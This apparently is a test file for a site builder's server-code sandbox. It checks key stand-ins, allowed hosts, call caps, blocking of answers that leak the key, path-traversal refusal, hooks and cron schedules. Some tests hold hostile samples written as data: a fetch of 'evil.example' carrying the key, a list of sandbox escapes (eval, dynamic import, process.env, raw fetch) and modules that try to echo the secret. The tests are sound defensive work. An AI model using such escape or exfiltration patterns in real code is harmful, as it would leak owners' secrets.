// THE SITE'S OWN SERVER CODE (2026-10-28): the model writes a `server-<name>`
// part; the site's Worker runs it at /api/db/<site>/fn/<name> through the
// `site` helper; the builder refuses code that reaches around the helper.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { loadTemplate } from "./fixtures/template-ts.mjs";
import { checkServerPart, vetServerCode, importsServer } from "../builder/server-code.mjs";

const KEY = "sk-live-owner-secret-123456";
const env = { OPENAI_KEY: KEY, APP_CONN: "" };
const url = (n) => new URL("https://kiln.gofarther.app/api/db/kiln/fn/" + n);
const req = (n, init) => new Request(url(n), { headers: { "CF-Connecting-IP": "1.2.3." + Math.random() }, ...init });

test("SF1 the key reaches the declared host and never the code", async () => {
  const { makeSite } = await loadTemplate("lib/site-functions.ts");
  const seen = [];
  const site = makeSite(env, "kiln", ["api.openai.com"], async (u, init) => { seen.push([u, init.headers.get("authorization")]); return new Response("{}"); });
  const stand = site.key("OPENAI_KEY");
  assert.ok(!stand.includes(KEY), "the code holds a stand-in, not the key");
  await site.fetch("https://api.openai.com/v1/chat", { method: "POST", headers: { authorization: "Bearer " + stand }, body: "{}" });
  assert.deepEqual(seen, [["https://api.openai.com/v1/chat", "Bearer " + KEY]]);
});

test("SF2 an undeclared host, http, a private address and a missing key are refused", async () => {
  const { makeSite } = await loadTemplate("lib/site-functions.ts");
  let called = 0;
  const site = makeSite(env, "kiln", ["api.openai.com"], async () => { called++; return new Response(""); });
  await assert.rejects(site.fetch("https://evil.example/x", { headers: { a: site.key("OPENAI_KEY") } }), /did not declare/);
  await assert.rejects(site.fetch("http://api.openai.com/x"), /refused/);
  await assert.rejects(site.fetch("https://api.openai.com/x", { headers: { a: site.key("NOT_SET") } }), /not set/);
  assert.equal(called, 0);
});

test("SF3 the call cap holds within one request", async () => {
  const { makeSite, CALLS_PER_REQUEST } = await loadTemplate("lib/site-functions.ts");
  const site = makeSite(env, "kiln", ["api.openai.com"], async () => new Response(""));
  for (let i = 0; i < CALLS_PER_REQUEST; i++) await site.fetch("https://api.openai.com/x");
  await assert.rejects(site.fetch("https://api.openai.com/x"), /too many/);
});

test("SF4 the route runs the module, marks it own, and withholds an answer carrying a key", async () => {
  const { siteFunction } = await loadTemplate("lib/site-functions.ts");
  const mods = {
    "/src/routes/-parts/server-ask.tsx": { hosts: [], default: async (r) => Response.json({ echo: new URL(r.url).pathname }) },
    "/src/routes/-parts/server-leak.tsx": { hosts: [], default: async () => new Response("here: " + KEY) },
    "/src/routes/-parts/server-boom.tsx": { hosts: [], default: async () => { throw new Error("bad " + KEY); } },
  };
  const ok = await siteFunction(req("ask"), env, url("ask"), "kiln", mods);
  assert.equal(ok.status, 200);
  assert.equal(ok.headers.get("x-site-data"), "own");
  // A text answer is streamed and stopped at the key; never delivered.
  const leak = await siteFunction(req("leak"), env, url("leak"), "kiln", mods);
  let leaked = "";
  try { leaked = await leak.text(); } catch { /* stopped */ }
  assert.ok(!leaked.includes(KEY));
  const binLeak = { "/src/routes/-parts/server-bin.tsx": { hosts: [], default: async () => new Response(new TextEncoder().encode(KEY), { headers: { "content-type": "application/octet-stream" } }) } };
  const bin = await siteFunction(req("bin"), env, url("bin"), "kiln", binLeak);
  assert.equal(bin.status, 500, "anything not text is read whole and withheld");
  const boom = await siteFunction(req("boom"), env, url("boom"), "kiln", mods);
  assert.ok(!(await boom.text()).includes(KEY));
  assert.equal((await siteFunction(req("none"), env, url("none"), "kiln", mods)).status, 404);
  assert.equal(await siteFunction(req("ask"), env, new URL("https://x.gofarther.app/api/db/other/fn/ask"), "kiln", mods), null);
});

test("SF5 the checker passes the right shape and refuses each way around the helper", () => {
  const good = `export const hosts = ["api.openai.com"];
export default async function (request: Request, site: any) {
  const r = await site.fetch(\`https://api.openai.com/v1/x\`, { headers: { authorization: "Bearer " + site.key("OPENAI_KEY") } });
  return new Response(await r.text());
}`;
  assert.deepEqual(checkServerPart({ name: "server-ask", source: good }), { ok: true });
  const bad = (s) => checkServerPart({ name: "server-x", source: `export const hosts = [];\nexport default async function () { ${s}; return new Response("") }` });
  for (const s of ["const k = env.OPENAI_KEY", "fetch('https://x.com')", "eval('1')", "new Function('x')", "await import('x')", "globalThis.fetch", "new WebSocket('wss://x')", "site['fetch']('x')", "process.env.X", `const u = \`\${fetch("x")}\``]) {
    assert.equal(bad(s).ok, false, s);
  }
  assert.equal(checkServerPart({ name: "server-x", source: "export default async function(){ return new Response('') }" }).ok, false, "no hosts");
  assert.equal(checkServerPart({ name: "server-x", source: "import x from 'y';\nexport const hosts = [];\nexport default async function(){ return new Response('') }" }).ok, false, "an import");
  assert.equal(checkServerPart({ name: "server-x", source: "export const hosts = [];\n// fetch( in a comment\nexport default async function(){ return new Response('fetch(') }" }).ok, true, "prose is not code");
});

test("SF6 a failing server part is left out; a browser file importing server code is named", () => {
  const r = vetServerCode({
    pages: [{ path: "index.tsx", source: 'import ask from "@/routes/-parts/server-ask";' }],
    parts: [{ name: "band-a", source: "x" }, { name: "server-ask", source: "export default 1" }],
  });
  assert.deepEqual(r.parts.map((p) => p.name), ["band-a"]);
  assert.ok(r.problems.some((p) => p.includes("server-ask") && p.includes("left out")));
  assert.deepEqual(r.leaking, ["index.tsx"]);
  assert.equal(importsServer('import a from "./-parts/band-a"'), false);
});

test("SF7 wiring: the site's Worker routes functions; publish vets parts before the build", () => {
  const server = readFileSync(new URL("../builder/lovable/template/src/server.ts", import.meta.url), "utf8");
  assert.match(server, /await siteFunction\(request, env as unknown as FnEnv, url, SITE_SLUG\)/);
  const pub = readFileSync(new URL("../builder/publish-pages.mjs", import.meta.url), "utf8");
  const at = pub.indexOf("vetServerCode({ pages: v.pages, parts: v.parts })");
  assert.ok(at > 0 && at < pub.indexOf("deps.images(v.pages"), "vetted before photographs and the compile");
  assert.match(pub.slice(at, pub.indexOf("lintPages(v.pages, spec)", at)), /v\.parts = vetted\.parts;\n\s*sitePartsForBuild = v\.parts;/);
});

test("SF8 hooks run on their event only, never for a visitor unless allowed", async () => {
  const { fireHooks, siteFunction } = await loadTemplate("lib/site-functions.ts");
  const got = [];
  const mods = {
    "/src/routes/-parts/server-text-owner.tsx": { hosts: [], on: ["created:bookings"], default: async (r) => { got.push(await r.json()); return new Response(""); } },
    "/src/routes/-parts/server-receipt.tsx": { hosts: [], on: ["paid:bookings"], visitors: true, default: async () => new Response("ok") },
  };
  assert.equal(await fireHooks(env, "kiln", "created:bookings", { table: "bookings", row: { id: 7 } }, mods), 1);
  assert.deepEqual(got, [{ event: "created:bookings", table: "bookings", row: { id: 7 } }]);
  assert.equal(await fireHooks(env, "kiln", "created:orders", {}, mods), 0);
  assert.equal((await siteFunction(req("text-owner"), env, url("text-owner"), "kiln", mods)).status, 404, "a hook is not callable from outside");
  assert.equal((await siteFunction(req("receipt"), env, url("receipt"), "kiln", mods)).status, 200, "unless it says visitors = true");
  const boom = { "/src/routes/-parts/server-x.tsx": { on: ["tick"], default: async () => { throw new Error("x"); } } };
  assert.equal(await fireHooks(env, "kiln", "tick", {}, boom), 1, "a failing hook never throws");
});

test("SF9 the hooks are wired: a write or payment (paid:<table>) and the clock", () => {
  const eff = readFileSync(new URL("../builder/lovable/template/src/lib/site-effects.ts", import.meta.url), "utf8");
  assert.match(eff, /r0\.payment_status === "paid" \? "paid" : action\) \+ ":" \+ table/);
  assert.match(eff, /later\(fireHooks\(env as unknown as FnEnv, slug, event, \{ table, row \}\)\)/);
  const tick = readFileSync(new URL("../builder/lovable/template/src/lib/site-webhook-retry.ts", import.meta.url), "utf8");
  assert.match(tick, /fireHooks\(env as unknown as FnEnv, slug, "tick"\)/);
});

test("SF10 the checker reads hook lists", () => {
  const base = (on) => checkServerPart({ name: "server-x", source: `export const hosts = [];\nexport const on = ${on};\nexport default async function () { return new Response("") }` });
  assert.equal(base('["created:bookings", "paid:orders", "tick"]').ok, true);
  assert.equal(base('["whenever"]').ok, false);
  assert.equal(base("events()").ok, false);
});

test("SF11 the model's `server` field becomes server parts", async () => {
  const { validatePages } = await import("../builder/page-gen.mjs");
  const r = validatePages({ pages: [], server: [{ name: "chat", source: "x" }, { name: "server-chat", source: "y" }, { name: "Bad Name", source: "z" }, { name: "empty", source: " " }] }, { partial: true });
  assert.deepEqual(r.parts, [{ name: "server-chat", source: "x" }]);
  assert.equal(r.problems.length, 3);
});

test("SF12 the fix loop: a refused part goes back once, kept and charged only if it then passes", () => {
  const pub = readFileSync(new URL("../builder/publish-pages.mjs", import.meta.url), "utf8");
  const a = pub.indexOf("let vetted = vetServerCode(");
  const b = pub.indexOf("v.parts = vetted.parts;", a);
  assert.ok(a > 0 && b > a);
  const body = pub.slice(a, b);
  assert.match(body, /send: deps\.compileRepair/);
  assert.match(body, /if \(next && checkServerPart\(next\)\.ok\) \{ fixedParts\.push\(next\); if \(res\.usage\) repairUsage\.push\(res\.usage\); \}/);
  assert.match(body, /deps\.compileRepairRoom/);
});

function memBucket() {
  const m = new Map();
  return {
    m,
    async get(k) { const v = m.get(k); return v ? { body: new Response(v.body).body, httpMetadata: v.meta, size: String(v.body).length } : null; },
    async put(k, body, o = {}) { m.set(k, { body: typeof body === "string" ? body : new TextDecoder().decode(body), meta: o.httpMetadata }); },
    async delete(k) { m.delete(k); },
    async list({ prefix }) { return { objects: [...m.keys()].filter((k) => k.startsWith(prefix)).map((key) => ({ key, size: 1 })), truncated: false }; },
  };
}

test("SF13 a text answer streams, and stops at a key even split across pieces", async () => {
  const { siteFunction } = await loadTemplate("lib/site-functions.ts");
  const stream = (pieces) => new ReadableStream({ start(c) { for (const p of pieces) c.enqueue(new TextEncoder().encode(p)); c.close(); } });
  const mods = {
    "/src/routes/-parts/server-chat.tsx": { hosts: [], default: async () => new Response(stream(["Hello, ", "the class ", "is at 10."]), { headers: { "content-type": "text/event-stream" } }) },
    "/src/routes/-parts/server-sneak.tsx": { hosts: [], default: async () => new Response(stream(["ok ", KEY.slice(0, 9), KEY.slice(9), " bye"]), { headers: { "content-type": "text/plain" } }) },
  };
  const ok = await siteFunction(req("chat"), env, url("chat"), "kiln", mods);
  assert.equal(ok.headers.get("x-site-data"), "own");
  assert.equal(await ok.text(), "Hello, the class is at 10.");
  const sneak = await siteFunction(req("sneak"), env, url("sneak"), "kiln", mods);
  let got = "";
  try { const r = sneak.body.getReader(); for (;;) { const { done, value } = await r.read(); if (done) break; got += new TextDecoder().decode(value); } } catch { /* stopped */ }
  assert.ok(!got.includes(KEY), "the key never reached the visitor");
});

test("SF14 the site's own files: put, get, list, delete, under fn-files/ only; bad names refused", async () => {
  const { makeSite } = await loadTemplate("lib/site-functions.ts");
  const B = memBucket();
  const site = makeSite({ ...env, OWN_BUCKET: "1", SITES: B }, "kiln", []);
  await site.files.put("invoices/7.txt", "Invoice 7", "text/plain");
  assert.deepEqual([...B.m.keys()], ["fn-files/invoices/7.txt"]);
  const r = await site.files.get("invoices/7.txt");
  assert.equal(r.headers.get("content-type"), "text/plain");
  assert.equal(await r.text(), "Invoice 7");
  assert.deepEqual(await site.files.list("invoices"), [{ name: "invoices/7.txt", size: 1 }]);
  await site.files.delete("invoices/7.txt");
  assert.equal(await site.files.get("invoices/7.txt"), null);
  await assert.rejects(site.files.put("../x", "a"), /file name/);
  await assert.rejects(site.files.put("/etc/x", "a"), /file name/);
  await assert.rejects(makeSite(env, "kiln", []).files.put("a.txt", "a"), /no file storage/);
});

test("SF15 exact schedules: once per due time, caught up once, first wake only starts the count", async () => {
  const { parseCron, cronMatches, cronDue, fireSchedules } = await loadTemplate("lib/site-functions.ts");
  const mon9 = parseCron("cron:TZ=Europe/London 0 9 * * 1");
  assert.ok(mon9);
  assert.equal(cronMatches(mon9, Date.parse("2026-11-02T09:00:00Z")), true, "Monday 9:00 London is 9:00 UTC in November");
  assert.equal(cronMatches(mon9, Date.parse("2026-10-19T08:00:00Z")), true, "8:00 UTC while London is on summer time");
  assert.equal(cronMatches(mon9, Date.parse("2026-11-02T08:00:00Z")), false);
  assert.equal(cronMatches(parseCron("cron:0 9,17 * * *"), Date.parse("2026-11-02T17:00:00Z")), true);
  assert.equal(cronMatches(parseCron("cron:*/15 * * * *"), Date.parse("2026-11-02T17:30:00Z")), true);
  assert.equal(cronMatches(parseCron("cron:*/15 * * * *"), Date.parse("2026-11-02T17:31:00Z")), false);
  assert.equal(parseCron("cron:hello"), null);
  assert.equal(cronDue(mon9, Date.parse("2026-11-02T08:55:00Z"), Date.parse("2026-11-02T09:04:00Z")), true);
  assert.equal(cronDue(mon9, Date.parse("2026-11-02T09:01:00Z"), Date.parse("2026-11-02T09:06:00Z")), false);
  const ran = [];
  const B = memBucket();
  const e = { ...env, OWN_BUCKET: "1", SITES: B };
  const mods = { "/src/routes/-parts/server-weekly.tsx": { hosts: [], on: ["cron:0 9 * * 1"], default: async (r) => { ran.push((await r.json()).event); return new Response(""); } } };
  assert.equal(await fireSchedules(e, "kiln", Date.parse("2026-11-02T08:50:00Z"), mods), 0, "first wake starts the count");
  assert.equal(await fireSchedules(e, "kiln", Date.parse("2026-11-02T08:58:00Z"), mods), 0);
  assert.equal(await fireSchedules(e, "kiln", Date.parse("2026-11-02T09:02:00Z"), mods), 1, "due");
  assert.equal(await fireSchedules(e, "kiln", Date.parse("2026-11-02T09:04:00Z"), mods), 0, "never twice");
  assert.deepEqual(ran, ["cron:0 9 * * 1"]);
});
